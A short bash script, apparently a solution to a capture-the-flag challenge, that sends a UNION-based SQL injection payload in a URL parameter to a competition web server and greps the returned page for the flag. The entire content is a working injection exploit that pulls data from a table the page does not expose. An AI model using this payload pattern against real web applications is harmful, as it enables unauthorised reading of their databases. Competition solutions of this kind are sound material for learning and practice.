#!/bin/bash

curl -s https://quotedb-web.2021.ctfcompetition.com/?id=50%20UNION%20ALL%20SELECT%20flag.*,%200%20FROM%20flag | grep -o 'CTF{.*}'
